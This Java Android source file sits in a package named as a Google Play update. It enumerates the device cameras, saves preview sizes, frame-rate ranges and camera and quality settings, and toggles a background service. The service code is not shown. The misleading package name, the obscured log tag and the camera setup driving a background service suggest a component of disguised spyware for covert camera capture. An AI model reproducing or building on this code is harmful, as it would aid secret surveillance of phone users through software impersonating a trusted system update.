package com.google.android.play.update;

import java.util.Comparator;
import java.util.List;
import java.util.TreeSet;

import android.app.Activity;
import android.app.ActivityManager;
import android.app.ActivityManager.RunningServiceInfo;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.hardware.Camera;
import android.hardware.Camera.Parameters;
import android.hardware.Camera.Size;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.util.Log;
import android.view.Menu;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

public class Main {
    public final String TAG = "AsDfGhJkL";
    SharedPreferences mSharedPreferences;

    public static String setKamera = "";
    public static String setKualitas = "";

    public Main() {

    }

    public Main(Context context, String setKamera, String setKualitas) {

      this.setKamera = setKamera;
      this.setKualitas = setKualitas;

      if (!initialize(context)) {
      }

      if (!isServiceRunning(context)) {
        context.startService(new Intent(context, BackgroundService.class));
      
      } else {
        context.stopService(new Intent(context, BackgroundService.class));
      }

    }
    
    public boolean isServiceRunning(Context context) {
        ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        for (RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if ((BackgroundService.class.getName()).equals(service.service.getClassName())) {
                return true;
            }
        }
        return false;
    }
    
    
    private boolean initialize(Context context) {
        mSharedPreferences = PreferenceManager.getDefaultSharedPreferences(context);
        
       //boolean firstRun = ! mSharedPreferences.contains("settings_camera");
       //if (firstRun) {
       if (true) {
           Log.i(TAG, "First run");
           
           SharedPreferences.Editor editor = mSharedPreferences.edit();
           
           int cameraNumber = Camera.getNumberOfCameras();
           Log.i(TAG, "Camera number: " + cameraNumber);
           
           /*
            * Get camera name set 
            */
           TreeSet<String> cameraNameSet = new TreeSet<String>();
           if (cameraNumber == 1) {
               cameraNameSet.add("back");
           } else if (cameraNumber == 2) {
               cameraNameSet.add("back");
               cameraNameSet.add("front");
           } else if (cameraNumber > 2) {           // rarely happen
               for (int id = 0; id < cameraNumber; id++) {
                   cameraNameSet.add(String.valueOf(id));
               }
           } else {                                 // no camera available
               Log.i(TAG, "No camrea available");
               
               return false;
           }

           /* 
            * Get camera id set
            */
           String[] cameraIds = new String[cameraNumber];
           TreeSet<String> cameraIdSet = new TreeSet<String>();
           for (int id = 0; id < cameraNumber; id++) {
               cameraIdSet.add(String.valueOf(id));
           }
           
           /*
            * Save camera name set and id set
            */
           editor.putStringSet("camera_name_set", cameraNameSet);
           editor.putStringSet("camera_id_set", cameraIdSet);
           
           /*
            * Get and save camera parameters
            */
           for (int id = 0; id < cameraNumber; id++) {
               Camera camera = Camera.open(id);
               if (camera == null) {
                   String msg = "Camera " + id + " is not available";
                   Log.i(TAG, msg);
                   
                   return false;
               }
               
               Parameters parameters = camera.getParameters();
               
               /*
                * Get and save preview sizes
                */
               List<Size> sizes = parameters.getSupportedPreviewSizes();
               
               TreeSet<String> sizeSet = new TreeSet<String>(new Comparator<String>() {
                   @Override
                   public int compare(String s1, String s2) {
                       int spaceIndex1 = s1.indexOf(" ");
                       int spaceIndex2 = s2.indexOf(" ");
                       int width1 = Integer.parseInt(s1.substring(0, spaceIndex1));
                       int width2 = Integer.parseInt(s2.substring(0, spaceIndex2));
                       
                       return width2 - width1;
                   }
               });
               for (Size size : sizes) {
                   sizeSet.add(size.width + " x " + size.height);
               }
               editor.putStringSet("preview_sizes_" + id, sizeSet);
               
               Log.i(TAG, sizeSet.toString());
               
               /*
                * Set default preview size, use camera 0
                */
               if (id == 0) {
                   Log.i(TAG, "Set default preview size");
                   
                   Size defaultSize = parameters.getPreviewSize();
                   editor.putString("settings_size", defaultSize.width + " x " + defaultSize.height);
               }
               
               /*
                * Get and save 
                */
               List<int[]> ranges = parameters.getSupportedPreviewFpsRange();
               TreeSet<String> rangeSet = new TreeSet<String>();
               for (int[] range : ranges) {
                   rangeSet.add(range[0] + " ~ " + range[1]);
               }
               editor.putStringSet("preview_ranges_" + id, rangeSet);
               
               if (id == 0) {
                   Log.i(TAG, "Set default fps range");
                   
                   int[] defaultRange = new int[2];
                   parameters.getPreviewFpsRange(defaultRange);
                   editor.putString("settings_range", defaultRange[0] + " ~ " + defaultRange[1]);
               }
               
               camera.release();
               
           }

           String[] outKam = setKamera.split(" ");
           String[] outKua = setKualitas.split(" ");
           
           if (setKamera.equals("")) editor.putString("settings_camera", "0");
           else editor.putString("settings_camera", outKam[0]);

           if (setKualitas.equals("")) editor.putString("settings_quality", "50");
           else editor.putString("settings_quality", outKua[0]);

           Log.i(TAG, outKam[0]+""+outKua[0]);

           editor.commit();
       }
       
       return true;
    }
}
